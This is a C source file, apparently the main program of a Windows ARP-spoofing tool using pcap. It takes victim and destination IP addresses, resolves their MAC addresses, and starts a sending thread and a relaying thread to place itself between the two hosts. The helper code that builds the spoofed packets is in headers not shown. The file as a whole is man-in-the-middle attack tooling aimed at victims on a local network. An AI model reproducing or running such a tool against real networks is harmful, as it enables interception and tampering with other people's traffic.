//#include "lookup.h"
#include "get_addr.h"
#include "thread_fuc.h"

int main(){
	input *str = NULL;
	pcap_if_t * device;
	device = find_dev(); // select device
	int target_count = 0;
	int i = 0;

	printf("input target count : ");
	scanf_s("%d", &target_count);

	str = (input*)malloc(sizeof(input) * target_count);

	RtlZeroMemory(str, sizeof(input) * target_count);

	str->data_check = target_count;

	for (i = 0; i < target_count; i++) ip_input(str + i); // input victim ip > input destination ip

	for (i = 0; i < target_count; i++){
		get_addr((str + i)->my_mac, (str + i)->destination_ip, device); // get_my mac, destination ip
		arp_table_update((str + i)->victim_ip);
		arp_table_update((str + i)->destination_ip);
		get_macaddr((str + i)->destination_ip, (str + i)->destination_mac); // get destination mac
		get_macaddr((str + i)->victim_ip, (str + i)->victim_mac); // get victim mac
	}

	send(device, NULL, 0); // make static handle
	relay_send(device, &str, NULL); // make static handle

	HANDLE thread[2]; // 쓰레드 저장 핸들러
	DWORD threadID[2]; // 쓰레드 번호

	printf("send start!\n");
	if ((thread[0] = (HANDLE)CreateThread(NULL, 0, send_thread, &str, 0, &threadID[0])) == 0){
		printf("send thread open error\n");
		exit(1);
	}

	if ((thread[1] = (HANDLE)CreateThread(NULL, 0, relay_thread, &str, 0, &threadID[1])) == 0){
		printf("relay thread open error\n");
		exit(1);
	}

	if (thread[0] != NULL && thread[1] != NULL) {
		/* wait threads to finish */
		WaitForMultipleObjects(2, thread, TRUE, INFINITE);
		for (int i = 0; i < 2; i++) CloseHandle(thread[i]);
	}

	return 0;
}